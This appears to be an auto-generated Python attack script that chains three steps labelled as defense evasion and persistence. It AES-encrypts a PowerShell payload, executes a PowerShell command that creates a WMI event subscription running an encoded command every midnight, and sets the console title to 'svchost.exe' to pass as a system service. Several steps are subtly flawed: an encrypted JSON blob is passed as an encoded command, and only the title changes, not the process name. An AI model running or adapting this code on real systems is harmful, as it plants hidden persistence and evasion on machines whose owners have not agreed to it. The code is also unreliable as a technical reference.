#!/usr/bin/env python3
import sys
import json
import time
import os
import subprocess
import ctypes
from typing import Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define a simple PowerShell script to obfuscate
        powershell_script = "Write-Host 'Hello, World!'"
        
        # Generate a random AES key and IV
        key = get_random_bytes(16)
        iv = os.urandom(16)
        
        # Pad the script to a 16-byte boundary
        padded_script = pad(powershell_script.encode(), AES.block_size)
        
        # Encrypt the script using AES CBC mode
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(padded_script)
        
        # Create the obfuscated script as a hex string
        obfuscated_script = {
            'ciphertext': ciphertext.hex(),
            'key': key.hex(),
            'iv': iv.hex()
        }
        
        # Convert the obfuscated script to a JSON string
        result = {'script': json.dumps(obfuscated_script)}
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'script': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        script = input_data.get('script', '')

        # Define the WMI command to create an event subscription
        subscription_name = "MyWMIEventSubscription"
        command = (
            f"powershell -Command \""
            f"$Filter=Set-WmiInstance -Namespace 'root\\subscription' -Class __EventFilter "
            f"-Arguments @{{Name='{subscription_name}'; EventNamespace='Root\\Cimv2'; "
            f"QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
            f"TargetInstance ISA \"Win32_LocalTime\" AND TargetInstance.Hour = 0 AND TargetInstance.Minute = 0'}}; "
            f"$Consumer=Set-WmiInstance -Namespace 'root\\subscription' -Class CommandLineEventConsumer "
            f"-Arguments @{{Name='{subscription_name}'; CommandLineTemplate='powershell -EncodedCommand {script}'}}; "
            f"$Binding=Set-WmiInstance -Namespace 'root\\subscription' -Class __FilterToConsumerBinding "
            f"-Arguments @{{Filter=$Filter; Consumer=$Consumer}}\""
        )

        # Execute the command to create the WMI event subscription
        subprocess.run(command, shell=True, check=True, timeout=10)

        result = {'subscription_id': subscription_name}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with fallback value None for subscription_id
        return {'success': False, 'data': {'subscription_id': None}, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define the legitimate service name to masquerade as
        legitimate_service_name = "svchost.exe"
        
        # Use ctypes to attempt to set the process name
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(legitimate_service_name)
            process_name = legitimate_service_name
        except Exception:
            # If setting the process name fails, log and return with a fallback value
            process_name = None

        result = {
            "process_name": process_name
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Obfuscate PowerShell Payload [defense-evasion] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Obfuscate PowerShell Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Obfuscate PowerShell Payload): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Create WMI Event Subscription [persistence] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Create WMI Event Subscription): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Create WMI Event Subscription): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Masquerade as Legitimate Service [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Masquerade as Legitimate Service): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Masquerade as Legitimate Service): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))